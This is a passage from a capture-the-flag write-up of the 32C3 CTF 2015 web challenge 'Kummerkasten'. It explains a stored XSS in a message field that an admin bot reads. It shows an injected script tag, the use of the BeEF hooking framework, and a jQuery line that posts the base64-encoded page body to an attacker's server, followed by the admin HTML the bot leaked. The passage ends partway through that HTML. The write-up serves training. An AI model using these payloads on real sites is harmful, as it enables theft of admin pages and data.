32C3 CTF 2015 : Kummerkasten
Category: Web Points: 300 Solves: 61 Description:

Our Admin is a little sad this time of the year. Maybe you can cheer him up at this site http://136.243.194.46/

Please note: This challenge does not follow the flag format.

Hints:

To build the flag, concatenate both parts and omit '32C3_'

Write-up
by 0xBADCA7

Strangely, this 32c3 CTF task weighted 300 points (while ITD was "only" 150) however it was a simple straightforward XSS. You're given a page like this: 

Your team is nearly arbitrary (just a basic filter) and the injectable field is the message itself. It is possible to inject <script src="yourstuff.js"></script> right away. Clearly, there's a bot reading all the messages so the first thing right off the bat I did was to hook in BeEF. The bot appeared in the logs shortly and then disconnected. I wasn't really disappointed as the original page already contained jQuery code so coding payloads would be a cakewalk.

First I dumped the current page the bot was seeing:

$.post('http://myserver', {'a': btoa($('body')[0].innerHTML)})
The bot returned this:

<script src="js/jquery-2.1.4.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/admin.js"></script>

    <nav class="navbar navbar-inverse">
      <div class="container">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="navbar-brand" href="/admin/comments">Admin</a>
        </div>
        <div id="navbar" c
